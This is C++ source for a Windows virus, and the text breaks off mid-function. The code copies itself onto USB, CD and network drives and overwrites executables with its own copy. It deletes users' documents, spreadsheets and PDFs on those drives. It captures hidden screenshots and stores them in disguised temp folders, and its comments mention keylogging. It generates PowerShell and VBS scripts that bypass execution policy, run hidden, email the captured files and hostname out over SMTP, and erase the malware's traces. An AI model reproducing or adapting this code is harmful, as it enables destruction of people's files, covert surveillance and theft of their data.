 #include<iostream>
#include<fstream>
#include<string>
#include<stdlib.h>
#include<tchar.h>
#include<stdio.h>
#include<windows.h> 
#include<vector>
#include<ole2.h>
#include<ole2.h>
#include<olectl.h>
#include<shlobj.h> 
#include<process.h> 
#include<Tlhelp32.h>
#include<wininet.h>

#pragma comment(lib,"wininet.lib") 

using namespace std;
long count=20000;//number of folders to infect before keylogging

//spread the virus to usb and removable media and network
//..............................................................
void spread( const std::string &dirpath)
{
	char szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
		//cout<<"my exe path = "<<szPath<<endl;

	string name=dirpath+"\\*";
	string name2=dirpath+"\\"+"Autosync.exe";
	//cout<<name2<<endl;
	ofstream files;
	WIN32_FIND_DATA find;
	HANDLE han=FindFirstFile(name.c_str(),&find);
	if(han!=INVALID_HANDLE_VALUE)
	{ 
		do
		{
			if(find.cFileName[0]!='.')
			{
				string fn=dirpath+"\\"+find.cFileName;

				//cout<<find.cFileName<<endl;
			
				if(fn.substr(fn.find_last_of(".")+1)=="ico")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="doc")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="docx")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="txt")//check file type
				{			
					remove(fn.c_str());//WARNING.!!!...Delete files	
				}
				if(fn.substr(fn.find_last_of(".")+1)=="xls")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="xlsx")//check file type
				{
						remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="pdf")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="ink")//check file type
				{
					remove(fn.c_str());//WARNING.!!!...Delete files
				}
				if(fn.substr(fn.find_last_of(".")+1)=="exe")//check file type
				{			
					CopyFile(szPath,fn.c_str(),0);//overwrite  file			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="EXE")//check file type
				{		
					CopyFile(szPath,fn.c_str(),0);//overwrite  file				
				}
				
				if(find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)

					{							
						spread(dirpath+"\\"+find.cFileName);					 
						 
						files.close();
					}
				}
				TCHAR SourcePath[_MAX_PATH];
				TCHAR SourceDrive[_MAX_DRIVE];
				TCHAR SourceDir[_MAX_DIR];
				TCHAR SourceFname[_MAX_FNAME];
				TCHAR SourceExt[_MAX_EXT];

				TCHAR DestPath[_MAX_PATH];
				TCHAR DestDrive[_MAX_DRIVE];
				TCHAR DestDir[_MAX_DIR];
				TCHAR DestFname[_MAX_FNAME];
				TCHAR DestExt[_MAX_EXT];
				
					LPCTSTR lpszFindPattern=TEXT("C:\\System\\Boot\\_tpf");				

				_splitpath(_T(szPath),SourceDrive,SourceDir,SourceFname,SourceExt);
				_splitpath(dirpath.c_str(),DestDrive,DestDir,DestFname,DestExt);

				_makepath(SourcePath,SourceDrive,SourceDir,SourceFname,SourceExt);
				_makepath(DestPath,DestDrive,DestDir,SourceFname,SourceExt);
				
				CopyFile(SourcePath,name2.c_str(),FALSE);
				//remove(name2.c_str());			
		}while(FindNextFile(han,&find));
	}
	
}
//................................................
//spread the virus to directories
//..............................................................
void GetFilesInDirectory( const std::string &dirpath)
{
	char szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
		//cout<<"my exe path = "<<szPath<<endl;

	string name=dirpath+"\\*";
	string name2=dirpath+"\\"+"Autosync.exe";
	//cout<<name2<<endl;
	ofstream files;
	WIN32_FIND_DATA find;
	HANDLE han=FindFirstFile(name.c_str(),&find);
	if(han!=INVALID_HANDLE_VALUE)
	{ 
		do
		{
			if(find.cFileName[0]!='.')
			{
				string fn=dirpath+"\\"+find.cFileName;

				//cout<<find.cFileName<<endl;
				

				if(fn.substr(fn.find_last_of(".")+1)=="doc")//check file type
				{

					//cout<<"files path"<<fn<<endl;

				//	remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}

				if(fn.substr(fn.find_last_of(".")+1)=="docx")//check file type
				{

				//cout<<"files path"<<fn<<endl;

				//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="txt")//check file type
				{

					//cout<<"files path"<<fn<<endl;

					//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="xls")//check file type
				{

					//cout<<"files path"<<fn<<endl;

					//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="xlsx")//check file type
				{

					//cout<<"files path"<<fn<<endl;

					//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}
				if(fn.substr(fn.find_last_of(".")+1)=="pdf")//check file type
				{

					//cout<<"files path"<<fn<<endl;

					//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}

				if(fn.substr(fn.find_last_of(".")+1)=="ink")//check file type
				{

					//cout<<"files path"<<fn<<endl;

					//remove(fn.c_str());//WARNING.!!!...Delete files 
			
				}
			
				if(find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)

					{	
						count-=1;//decrement folder count
						if(count<=0)return;//exit recursion to start keylogging and spying
									
						GetFilesInDirectory(dirpath+"\\"+find.cFileName);					 
						 
						files.close();
					}
				}
				TCHAR SourcePath[_MAX_PATH];
				TCHAR SourceDrive[_MAX_DRIVE];
				TCHAR SourceDir[_MAX_DIR];
				TCHAR SourceFname[_MAX_FNAME];
				TCHAR SourceExt[_MAX_EXT];

				TCHAR DestPath[_MAX_PATH];
				TCHAR DestDrive[_MAX_DRIVE];
				TCHAR DestDir[_MAX_DIR];
				TCHAR DestFname[_MAX_FNAME];
				TCHAR DestExt[_MAX_EXT];
				
					LPCTSTR lpszFindPattern=TEXT("C:\\System\\Boot\\_tpf");
				

				_splitpath(_T(szPath),SourceDrive,SourceDir,SourceFname,SourceExt);
				_splitpath(dirpath.c_str(),DestDrive,DestDir,DestFname,DestExt);


				_makepath(SourcePath,SourceDrive,SourceDir,SourceFname,SourceExt);
				_makepath(DestPath,DestDrive,DestDir,SourceFname,SourceExt);

				
			//	CopyFile(SourcePath,name2.c_str(),FALSE);
				//remove(name2.c_str());
				
		}while(FindNextFile(han,&find));
	}
	
}
//..............................................................
	//runs in a loop to check and infect USB drives 

void USB_NETWORK_INFECT()
{
	DWORD dwSize=MAX_PATH;
	char szLogicalDrives[MAX_PATH];
	DWORD dwResult=GetLogicalDriveStrings(dwSize,szLogicalDrives);

	if(dwResult>0 && dwResult<=MAX_PATH)
	{
		char *szSingleDrive=szLogicalDrives;
		while(*szSingleDrive)
		{	
			//printf("Drive:%s\n",szSingleDrive);
			if(GetDriveType(szSingleDrive)==DRIVE_UNKNOWN)
			{
				const std::string directory=szSingleDrive;
				spread( directory);
			}			
			if(GetDriveType(szSingleDrive)==DRIVE_CDROM)
			{
				const std::string directory=szSingleDrive;
				spread( directory);
			}
			if(GetDriveType(szSingleDrive)==DRIVE_REMOVABLE)
			{	
				//cout<<"Drive type removable"<<endl;
				const std::string directory=szSingleDrive;
				spread( directory);
			}
			
			if(GetDriveType(szSingleDrive)==DRIVE_REMOTE)
			{
				const std::string directory=szSingleDrive;
				spread( directory);
			}
			
			//get the next drive
			szSingleDrive+=strlen(szSingleDrive)+1;	
		}
	}
	
}

//..............................................................
	//rename image screenshot saved funtion
void renameimage()
{
	char buffer[L_tmpnam];
	char *pointer;

	tmpnam(buffer);
	printf("Tempname #1: %s\n",buffer);   

	pointer=tmpnam(NULL);
	printf("Tempname #2: %s\n",pointer); 

	TCHAR fold[MAX_PATH+1];
	DWORD result=GetTempPath(MAX_PATH+1,fold);	

	strcat(fold,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\image.jpeg");

	TCHAR fold2[MAX_PATH+1];
	DWORD result2=GetTempPath(MAX_PATH+1,fold2);

	strcat(fold2,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5");

	string dirpath=fold2;

	string oldname=fold;
	string  newname=dirpath + "\\"+ pointer + ".nls"+"\0";
	cout<<oldname<<endl;
	cout<<newname<<endl;
	rename(oldname.c_str(),newname.c_str());
}
//..............................................................

//..............................................................
//save screenshot function
bool saveBitmap(LPCSTR filename,HBITMAP bmp,HPALETTE pal)
{
	bool result=false;
	PICTDESC pd;

	pd.cbSizeofstruct=sizeof(PICTDESC);
	pd.picType=PICTYPE_BITMAP;
	pd.bmp.hbitmap=bmp;
	pd.bmp.hpal=pal;

	LPPICTURE picture;
	HRESULT res=OleCreatePictureIndirect(&pd,IID_IPicture,false,reinterpret_cast<void**>(&picture));
	
	if(!SUCCEEDED(res))return false;

	LPSTREAM stream;

	res=CreateStreamOnHGlobal(0,true,&stream);

	if(!SUCCEEDED(res))
	{		
		picture->Release();
		return false;
	}

	LONG bytes_streamed;

	res=picture->SaveAsFile(stream,true,&bytes_streamed);

	HANDLE file=CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);

	if(!SUCCEEDED(res)||!file)
	{		
		stream->Release();
		picture->Release();
		return false;
	}

	HGLOBAL mem=0;
	GetHGlobalFromStream(stream,&mem);
	LPVOID data=GlobalLock(mem);

	DWORD bytes_written;

	result=!!WriteFile(file,data,bytes_streamed,&bytes_written,0);
	result&=(bytes_written==static_cast <DWORD>(bytes_streamed));

	GlobalUnlock(mem);
	CloseHandle(file);

	stream->Release();
	picture->Release();
	return result;
}
//..............................................................
//get afile to change extension
string getFileName(const string &s)
{
	char sep='/';
	#ifdef _WIN32
		sep='\\';
	#endif
	size_t i=s.rfind(sep,s.length());
	if(i!=string::npos)
	{
		string filename=s.substr(i+1,s.length()-i);
		size_t lastindex=filename.find_last_of(".");
		string rawname=filename.substr(0,lastindex);
		return(rawname);
	}
	return("");
}
//..............................................................
// change extension of files

void changeFileExtension()
{
	char myPath[MAX_PATH];
	GetModuleFileName(NULL,myPath,MAX_PATH);
	cout<<"my exe path = "<<myPath<<endl;

	char szPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,szPath);
		//cout<<"my exe path = "<<szPath<<endl;
	string dirpath=szPath;
	string name=dirpath+"\\*";
	ofstream files;
	WIN32_FIND_DATA find;
	HANDLE han=FindFirstFile(name.c_str(),&find);
	if(han!=INVALID_HANDLE_VALUE)
	{ 
		do
		{	
			if((find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)==false)
			{					
				cout<<find.cFileName<<endl;	
						
				if(find.cFileName[0]!='.')
				{
					string fn=dirpath+"\\"+find.cFileName;
					//cout<<"fn :"<<fn<<endl;
					char *pointer;

					string path = fn;
					string ss=getFileName(path);
					cout<<"The file name is :"<<ss<<endl;


					pointer=find.cFileName;


									
					string ext=fn.substr(fn.find_last_of(".")+1);

					cout<<"The file name is :"<<ss<<endl;
					cout<<"The extension is :"<<ext<<endl;

					string  newname=ss+"."+ext+"\0";

					fn=newname;
					string oldname=fn;
					//	if(fn.substr(fn.find_last_of(".")+1)=="txt")//check file type
					//{
					 rename(oldname.c_str(),newname.c_str());
					CopyFile(myPath,find.cFileName,0);//overwrite  file	
			
					//	}
					//	cout<<"OLD NAME :"<<oldname<<endl;
					//cout<<"new name :"<<newname<<endl;
				}
			}

		}while(FindNextFile(han,&find));	
	}	

}/*
void warning()
{
	char saveLocation[MAX_PATH]={0};
	SHGetSpecialFolderPath(NULL,saveLocation,CSIDL_DESKTOPDIRECTORY,FALSE);
	//Now savelocaation contains the path to the desktop
	//Append our filename to it
	strcat(saveLocation,"\\THE SERMON.txt");
	ofstream file;
	file.open(saveLocation,ios::binary);

	file<<" - The author of this message remains anonymous for the wilderness...";
	file<<"\r\n - Have fun...!\r\n";
	file<<"\r\nThe Sermon";
	file<<"\r\nJohn 3:16\r\n"<<"----------------------------------------------------------------";
	file<<".\r\n  For God so loved the world that he gave his one and only son,";
	file<<".\r\nthat whoever believes in him shall not perish";
	file<<".\r\n but have eternal life";
	file<<".\r\n........";
	file<<"\r\n_______________________________________________________________________________________________________";
	file<<".\r\n..........";
	file.close();
	cout<<saveLocation<<endl;				
}
//send a copy of the virus to desktop
void desktopFile()
{
	
	char szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
	//cout<<"my exe path = "<<szPath<<endl

	string path=szPath;
	string ss=getFileName(path);
	
	char saveLocation[MAX_PATH]={0};
	SHGetSpecialFolderPath(NULL,saveLocation,CSIDL_DESKTOPDIRECTORY,FALSE);
	//Now savelocaation contains the path to the desktop
	//Append our filename to it
	strcat(saveLocation,"\\WINDOWS~OS");
	CreateDirectory(saveLocation,0);
	strcat(saveLocation,"\\SYS~WINDOWS.exe");
	
	//cout<<saveLocation<<endl;
	CopyFile(szPath,saveLocation,0);		
}*/
void ClearContents()
{
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\OjQwOTZ9XSwiaXR.vbs");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\Q1WV9nRy16dF.ps1");
	
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\2.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\3.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\4.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\5.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\6.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\7.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\8.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\9.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\10.nls");
	remove("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1e0bcd1824.nls");
}
void TakeScreenshot()//-----------------------------------save screenshot
{ 
	int nScreenWidth=GetSystemMetrics(SM_CXSCREEN);	 
	int nScreenHeight=GetSystemMetrics(SM_CYSCREEN);

	HWND hDesktopWnd=GetDesktopWindow();
	HDC hDesktoDC=GetDC(hDesktopWnd);
	HDC hCaptureDC=CreateCompatibleDC(hDesktoDC);
	HBITMAP hCaptureBitmap=CreateCompatibleBitmap(hDesktoDC,nScreenWidth,nScreenHeight);
	SelectObject(hCaptureDC,hCaptureBitmap);
	BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,hDesktoDC,0,0,SRCCOPY);
	
	//hide screenshots in temp folder
	TCHAR Screenshot[MAX_PATH+1];
	DWORD myScreenshot=GetTempPath(MAX_PATH+1,Screenshot);
	
	strcat(Screenshot,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\image.jpeg");
	LPCSTR fname=Screenshot;
	HPALETTE hPal=NULL;
	
	saveBitmap(fname,hCaptureBitmap,hPal);

	ReleaseDC(hDesktopWnd,hDesktoDC);
	DeleteDC(hCaptureDC);
	DeleteObject(hCaptureBitmap);

	renameimage(); 

}
void SelfDeletePs1()//-----------------------------------  self delete ps1 script 
{ 		 
	ofstream file; 
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.ps1");
	string PowerShell; 	 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.exe'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.vbs'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.ps1'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	
	file<<PowerShell;
	file.close();
}
void SelfDeleteVbs()//-----------------------------------  self delete ps1 script 
{ 		 
	ofstream file; 
	string vbs;
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.vbs");
	vbs="command=\"Powershell -nologo -ExecutionPolicy Bypass -F C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.ps1\"\n" ;//*-----------------------------------  EXECUTE THE PS1 script */
	vbs+="set shell=CreateObject(\"WScript.Shell\")\n";
	vbs+="shell.Run command,0\n";
	file<<vbs;
	file.close();

}
void RunSelfDeleteVbs()//-----------------------------------  EXECUTE THE VBS script 
{ 
	SelfDeletePs1();
	SelfDeleteVbs();

	ShellExecute(NULL,"open","C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\debug.vbs",NULL,NULL,SW_NORMAL) ;
}

void killProcessByName(const char *filename)
{
	HANDLE hSnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPALL,NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize=sizeof(pEntry);
	BOOL hRes=Process32First(hSnapShot,&pEntry);
	while(hRes)
	{
		if(strcmp(pEntry.szExeFile,filename)==0)
		{
			HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,0,(DWORD)pEntry.th32ProcessID);
			if(hProcess!=NULL)
			{
				TerminateProcess(hProcess,9);
				CloseHandle(hProcess);
			}
		}
		hRes=Process32Next(hSnapShot,&pEntry);	
	}
	CloseHandle(hSnapShot);
} 
void CreatePs1()
{
	 
	ofstream file; 
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\sdBoom.ps1");
	string PowerShell; 
	PowerShell="$env:Temp\n";
	PowerShell+="$TempPath=$env:Temp\n";

	PowerShell+="$MyTempDirpath='\\en-US\\*'\n";
	PowerShell+="$MyTempDirectory=$TempPath+$MyTempDirpath\n";
	PowerShell+="Remove-Item $MyTempDirectory -Recurse -Force\n"; 

	PowerShell+="$MyTempDirpath2='\\WMIPRVSE\\*'\n";
	PowerShell+="$MyTempDirectory2=$TempPath+$MyTempDirpath2\n";
	PowerShell+="Remove-Item $MyTempDirectory2 -Recurse -Force\n";

	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\*'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n";


	file<<PowerShell;
	file.close();
}

void Createvbs() 
{ 
	ofstream file; 
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\debug.vbs");
	string vbs;

	vbs="command=\"Powershell -nologo -ExecutionPolicy Bypass -F C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\sdBoom.ps1\"\n" ;//*-----------------------------------  EXECUTE THE PS1 script */
	vbs+="set shell=CreateObject(\"WScript.Shell\")\n";
	vbs+="shell.Run command,0\n";
	file<<vbs;
	file.close();
}
void RunVbs()//-----------------------------------  EXECUTE THE VBS script 
{ 

	ShellExecute(NULL,"open","C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\debug.vbs",NULL,NULL,SW_NORMAL) ;
}

void CreatePs1_Script()
{
	TCHAR fold[MAX_PATH+1];
	DWORD result=GetTempPath(MAX_PATH+1,fold); 
	strcat(fold,"\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\*.* ");
	//------------------------------------------------------- Create a PowerShell script using C++ to upload e-mail
	ofstream file; 
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\Q1WV9nRy16dF.ps1");
	string PowerShell;	
	//----------------------------------------------------Upload an file as attachment to email

	PowerShell="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1e0bcd1824.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n";
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\2.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n";
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\3.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\4.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\5.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\6.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\7.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\8.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\9.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 
	PowerShell+="$debug='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\10.nls'\n";
	PowerShell+="Remove-Item $debug -Recurse -Force\n"; 

	PowerShell+="$Message=new-object Net.Mail.MailMessage\n";
	PowerShell+="$smtpServer='smtp-mail.email.com'\n";
	PowerShell+="$EmailFrom='password2024@email.com'\n";
	PowerShell+="$Password='password2024'\n";
	PowerShell+="$smtp=new-object Net.Mail.SmtpClient($smtpServer,587)\n";
	PowerShell+="$smtp.Credentials=New-Object System.Net.NetworkCredential($EmailFrom,$Password)\n";	 
	PowerShell+="$smtp.EnableSsl=$true\n";
	PowerShell+="$smtp.Timeout=500000\n";
	PowerShell+="$Message.From=$EmailFrom\n";
	PowerShell+="$Message.To.Add($EmailFrom)\n";
	PowerShell+="$hostname=(hostname)\n";

	PowerShell+="$env:Temp\n";
	PowerShell+="$TempPath=$env:Temp\n";
	PowerShell+="$MyTempDirpath='\\en-US\\COMMDLG\\inf\\Win32dbg\\Dg5RDU2WXVPRm\\TQ4QVNNWmV5\\*.*'\n";
	PowerShell+="$MyTempDirectory=$TempPath+$MyTempDirpath\n";
	PowerShell+="$attachment=(Get-ChildItem -Path $MyTempDirectory  -Recurse|%{$_.FullName})\n";//------Get all files
	PowerShell+="$count=0\n";
	PowerShell+="$name=0\n";
	PowerShell+="foreach($att in $attachment)\n";
	PowerShell+="{\n";
	PowerShell+="if($count -eq 10)\n";			
	PowerShell+="{break}\n";
	PowerShell+="$count=$count+1\n";
	PowerShell+="$name=$name+1\n";			 
	PowerShell+="Write-host ' '\n";
	PowerShell+="write-host 'Count ='$count\n";	
	PowerShell+="write-host '$att ='$att\n";
	PowerShell+="Move-Item $attachment 'C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1e0bcd1824.nls'\n";
	PowerShell+="rename-Item 'C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\1e0bcd1824.nls' $name'.nls'\n";
	PowerShell+="}\n";

	PowerShell+="$MyUploadpath='C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\*.*'\n";
	PowerShell+="$MyUploadDirectory=$MyUploadpath\n";
	PowerShell+="$files=(Get-ChildItem -Path $MyUploadDirectory -Recurse|%{$_.FullName})\n";//------Get all files
	PowerShell+="$Message.Subject=$hostname\n"; //----------------Get Computer Name
	PowerShell+="foreach($file in $files)\n";
	PowerShell+="{\n";
	PowerShell+="$attached=new-object Net.Mail.Attachment($file)\n"; 
	PowerShell+="$Message.Attachments.Add($attached)\n";//-------------------------------------attach files
	PowerShell+="}\n";
	PowerShell+="$smtp.Send($Message)\n";//------------------------------------------------send E-mail 	
	PowerShell+="Write-host ' '\n";
	PowerShell+="write-host 'My Attachments ='$attachment\n";
	PowerShell+="Write-host ' '\n";
	PowerShell+="write-host 'My Upload Folder ='$MyTempDirectory\n"; 
	PowerShell+="Write-host ' '\n";
	PowerShell+="write-host 'Computer Name ='$hostname\n";
	PowerShell+="Write-host ' '\n";
	PowerShell+="Write-host 'Temp Path ='$TempPath\n";
	PowerShell+="Write-host ' '\n";
	PowerShell+="write-host 'Operation successful!'\n";
	PowerShell+="Write-host ' '\n";


	file<<PowerShell;
	
	file.close();
}
//------------------------------------------------------- Create a VBS script using C++ to execute powershell ps1
void myVbs()
{
	ofstream file; 
	string vbs;
	file.open("C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\OjQwOTZ9XSwiaXR.vbs");
	vbs="command=\"Powershell -nologo -ExecutionPolicy Bypass -F C:\\System\\iexplore\\MSENV\\VSDPL\\hwnd\\IE4A\\WinFXLst\\VSS\\Win32dbg\\4RWw1Q014VDV\\icsxml\\eFgztR\\msjtKs40\\Q1WV9nRy16dF.ps1\"\n" ;//*-----------------------------------  EXECUTE THE PS1 script */
	vbs+="set shell=CreateObject(\"WScript.Shell\")\n";
	vbs+="shell.Run command,0\n";
	file<<vbs;
	file.close();
}
void StartVbs()//-----------------------------------  EXECUTE THE VBS script 
{ 
